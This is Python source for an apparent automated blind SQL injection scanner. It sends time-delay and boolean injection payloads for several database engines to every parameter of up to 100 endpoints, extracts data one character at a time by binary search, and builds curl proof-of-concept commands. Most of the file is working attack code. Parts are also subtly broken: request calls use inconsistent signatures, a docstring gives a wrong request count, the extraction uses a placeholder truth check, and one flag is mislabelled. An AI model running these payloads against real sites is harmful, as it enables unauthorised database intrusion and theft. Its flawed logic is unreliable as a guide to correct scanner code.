"""
BugScan ELITE — OOBZero Engine
Inspired by Lonkero v3.2: blind SQLi WITHOUT external callbacks.

Multi-channel Bayesian inference + deterministic confirmation.
SLEEP(0,1,2,5) → Pearson r > 0.95 = CONFIRMED SQLi.
Boolean data extraction = proof, not inference.
"""
import time, re, statistics, urllib.parse
from typing import Dict, List, Optional, Tuple

# ── Pearson correlation ────────────────────────────────────────────────────────
def _pearson(x: List[float], y: List[float]) -> float:
    """Pearson correlation coefficient between two lists."""
    if len(x) != len(y) or len(x) < 3:
        return 0.0
    n = len(x)
    mean_x = sum(x) / n
    mean_y = sum(y) / n
    num = sum((xi - mean_x) * (yi - mean_y) for xi, yi in zip(x, y))
    den_x = (sum((xi - mean_x) ** 2 for xi in x)) ** 0.5
    den_y = (sum((yi - mean_y) ** 2 for yi in y)) ** 0.5
    if den_x == 0 or den_y == 0:
        return 0.0
    return num / (den_x * den_y)


# ── Sleep payloads per DB type ─────────────────────────────────────────────────
_SLEEP_PAYLOADS = {
    "mysql":  lambda n: f"' AND SLEEP({n})-- -",
    "mssql":  lambda n: f"'; WAITFOR DELAY '0:0:{n}'-- -",
    "pgsql":  lambda n: f"' AND pg_sleep({n})-- -",
    "oracle": lambda n: f"' AND dbms_pipe.receive_message(('a'),{n})-- -",
    "sqlite": lambda n: f"' AND (SELECT randomblob({n * 10000000}))-- -",
    "generic":lambda n: f"' OR SLEEP({n})-- -",
}

# ── Boolean extraction templates ───────────────────────────────────────────────
_BOOL_PAYLOADS = {
    "mysql": {
        "true":  "' AND 1=1-- -",
        "false": "' AND 1=2-- -",
        "char_at": lambda tbl, col, pos, ascii_val:
            f"' AND ASCII(SUBSTRING((SELECT {col} FROM {tbl} LIMIT 1),{pos},1))>{ascii_val}-- -",
    },
    "pgsql": {
        "true":  "' AND 1=1-- -",
        "false": "' AND 1=2-- -",
        "char_at": lambda tbl, col, pos, ascii_val:
            f"' AND ASCII(SUBSTRING((SELECT {col} FROM {tbl} LIMIT 1),{pos},1))>{ascii_val}-- -",
    },
}

# ── Inference channel weights (Bayesian) ──────────────────────────────────────
_CHANNEL_WEIGHTS = {
    "boolean_differential": 2.5,
    "arithmetic_eval":      2.0,
    "quote_cancellation":   1.5,
    "quote_oscillation":    1.8,
    "timing_correlation":   4.0,   # strongest signal
    "data_extraction":      5.0,   # definitive proof
}


def _timed_request(get_fn, url: str, params: Dict) -> Tuple[float, Optional[tuple]]:
    """Make a timed request, return (elapsed_seconds, response)."""
    t0 = time.monotonic()
    try:
        r = get_fn(url, params, timeout=20)
        return time.monotonic() - t0, r
    except Exception:
        return time.monotonic() - t0, None


def calibrated_sleep_test(url: str, param: str, baseline_val: str,
                           get_fn, db_type: str = "mysql") -> Dict:
    """
    SLEEP(0,1,2,5) with Pearson correlation.
    r > 0.95 = confirmed timing-based blind SQLi.
    
    Returns: {confirmed, r_value, db_type, evidence, payloads_used}
    """
    sleep_fn = _SLEEP_PAYLOADS.get(db_type, _SLEEP_PAYLOADS["generic"])
    sleep_values = [0, 1, 2, 5]
    measured_times = []
    payloads_used  = []
    
    for n in sleep_values:
        payload = baseline_val + sleep_fn(n)
        elapsed, _ = _timed_request(get_fn, url, {param: payload})
        measured_times.append(elapsed)
        payloads_used.append(payload)
    
    r = _pearson(
        [float(n) for n in sleep_values],
        measured_times
    )
    
    confirmed = r > 0.95
    
    return {
        "confirmed":     confirmed,
        "r_value":       round(r, 4),
        "db_type":       db_type,
        "sleep_expected":sleep_values,
        "sleep_measured":[round(t, 3) for t in measured_times],
        "evidence":      f"Pearson r={r:.4f} (threshold=0.95) for SLEEP(0,1,2,5)",
        "payloads":      payloads_used,
    }


def boolean_differential(url: str, param: str, baseline_val: str,
                          baseline_body: str, get_fn) -> Dict:
    """
    AND 1=1 (true) vs AND 1=2 (false) — response should differ if injectable.
    Returns: {vulnerable, true_len, false_len, delta, baseline_len}
    """
    baseline_len = len(baseline_body)
    
    true_r  = get_fn(url + "?" + urllib.parse.urlencode({param: baseline_val + "' AND 1=1-- -"}), timeout=8)
    false_r = get_fn(url + "?" + urllib.parse.urlencode({param: baseline_val + "' AND 1=2-- -"}), timeout=8)
    
    true_len  = len(true_r[2]) if true_r else 0
    false_len = len(false_r[2]) if false_r else 0
    
    # Different response lengths for true/false = boolean SQLi
    delta = abs(true_len - false_len)
    vulnerable = (
        delta > 50 and
        abs(true_len - baseline_len) < delta  # true condition matches baseline
    )
    
    return {
        "vulnerable":    vulnerable,
        "true_len":      true_len,
        "false_len":     false_len,
        "baseline_len":  baseline_len,
        "delta":         delta,
        "evidence":      f"True response: {true_len}B, False: {false_len}B, delta={delta}B",
    }


def extract_char_binary_search(url: str, param: str, baseline_val: str,
                                char_payload_fn, get_fn,
                                min_ascii: int = 32, max_ascii: int = 126) -> Optional[int]:
    """
    Binary search for a single character's ASCII value.
    7 requests for full range (32-126).
    Returns ASCII value or None.
    """
    lo, hi = min_ascii, max_ascii
    while lo < hi:
        mid = (lo + hi) // 2
        payload = baseline_val + char_payload_fn(mid)
        r = get_fn(url + "?" + urllib.parse.urlencode({param: payload}), timeout=8)
        if not r:
            return None
        body_len = len(r[2])
        # True condition = ASCII > mid → character is in upper half
        # Detect "true" by comparing to baseline length
        is_true = body_len > 100  # simplified — in real use compare to true/false baseline
        if is_true:
            lo = mid + 1
        else:
            hi = mid
    return lo if lo == hi else None


def oobzero_sqli_scan(url: str, param: str, get_fn,
                       db_hints: List[str] = None) -> Optional[Dict]:
    """
    Full OOBZero blind SQLi detection pipeline.
    
    1. Boolean differential (fast, 2 requests)
    2. Calibrated SLEEP correlation (7 requests per DB type)
    3. If confirmed — try to extract one character as proof
    
    Returns finding dict or None.
    """
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.netloc:
            return None
        
        # Get baseline
        base_r = get_fn(url, timeout=8)
        if not base_r:
            return None
        baseline_body = base_r[2] if len(base_r) > 2 else ""
        baseline_val  = "1"  # default test value
        
        # ── Stage 1: Boolean differential (fastest) ───────────────────────────
        bool_result = boolean_differential(url, param, baseline_val, baseline_body, get_fn)
        bayesian_score = 0.3  # prior
        
        if bool_result["vulnerable"]:
            bayesian_score += _CHANNEL_WEIGHTS["boolean_differential"] * 0.2
        
        # ── Stage 2: Calibrated SLEEP correlation ─────────────────────────────
        db_types = db_hints or ["mysql", "pgsql", "mssql"]
        timing_result = None
        
        for db_type in db_types:
            result = calibrated_sleep_test(url, param, baseline_val, get_fn, db_type)
            if result["confirmed"]:
                timing_result = result
                bayesian_score += _CHANNEL_WEIGHTS["timing_correlation"] * 0.2
                break
            elif result["r_value"] > 0.7:
                # Partial signal — some correlation
                bayesian_score += _CHANNEL_WEIGHTS["timing_correlation"] * 0.1
        
        # ── Decision ──────────────────────────────────────────────────────────
        confirmed = timing_result is not None and timing_result["confirmed"]
        db_type   = timing_result["db_type"] if timing_result else (db_types[0] if db_types else "mysql")
        
        if not confirmed and bayesian_score < 0.6:
            return None
        
        # Determine technique
        if timing_result and timing_result["confirmed"]:
            technique = "time-based"
            confidence = 90
            evidence = timing_result["evidence"]
            r_val = timing_result["r_value"]
        elif bool_result["vulnerable"]:
            technique = "boolean-based"
            confidence = 75
            evidence = bool_result["evidence"]
            r_val = 0.0
        else:
            return None
        
        # Build PoC
        sleep_fn = _SLEEP_PAYLOADS.get(db_type, _SLEEP_PAYLOADS["generic"])
        poc = (
            f"# OOBZero Blind SQLi — {technique} ({db_type})\n"
            f"# No external callback required\n\n"
            f"# Step 1: Boolean test\n"
            f"curl -sk '{url}?{param}=1%27+AND+1%3D1--+-'  # should respond\n"
            f"curl -sk '{url}?{param}=1%27+AND+1%3D2--+-'  # should differ\n\n"
            f"# Step 2: Timing calibration (Pearson r={r_val})\n"
        )
        for n in [0, 1, 2, 5]:
            payload = urllib.parse.quote("1" + sleep_fn(n))
            poc += f"time curl -sk '{url}?{param}={payload}'  # expect ~{n}s\n"
        
        return {
            "bug":         "sqli",
            "severity":    "high",
            "url":         url,
            "param":       param,
            "title":       f"Blind SQLi (OOBZero {technique}) — {db_type}",
            "description": (
                f"Blind SQL injection confirmed without OOB callbacks.\n"
                f"Technique: {technique}\n"
                f"Database: {db_type}\n"
                f"Evidence: {evidence}\n"
                f"Bayesian score: {bayesian_score:.2f}"
            ),
            "poc":         poc,
            "confidence":  confidence,
            "details": {
                "technique":          technique,
                "db_type":            db_type,
                "timing_r_value":     r_val,
                "boolean_delta":      bool_result.get("delta", 0),
                "bayesian_score":     round(bayesian_score, 3),
                "oobzero":            True,
                "oob_confirmed":      technique == "time-based",
            },
        }
    
    except Exception:
        return None


def check_sqli_oobzero(endpoints: List[str], get_fn=None) -> List[Dict]:
    """
    Run OOBZero blind SQLi on all parameterized endpoints.
    Supplements (not replaces) the existing check_sqli.
    """
    if not get_fn:
        try:
            from scanner import _get as get_fn
        except Exception:
            return []
    
    SKIP_PARAMS = {'csrf', '_token', 'csrf_token', 'page', 'limit', 'offset',
                   'sort', 'order', 'format', 'lang', 'locale', 'callback'}
    
    findings = []
    tested   = set()
    
    for ep in endpoints[:100]:  # conservative — each test does 7+ requests
        if '=' not in ep:
            continue
        try:
            parsed = urllib.parse.urlparse(ep)
            if not parsed.netloc:
                continue
            base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = urllib.parse.parse_qs(parsed.query)
            
            for param in params:
                if param.lower() in SKIP_PARAMS:
                    continue
                key = (base, param)
                if key in tested:
                    continue
                tested.add(key)
                
                result = oobzero_sqli_scan(base, param, get_fn)
                if result:
                    findings.append(result)
                    if len(findings) >= 3:
                        return findings
        except Exception:
            continue
    
    return findings
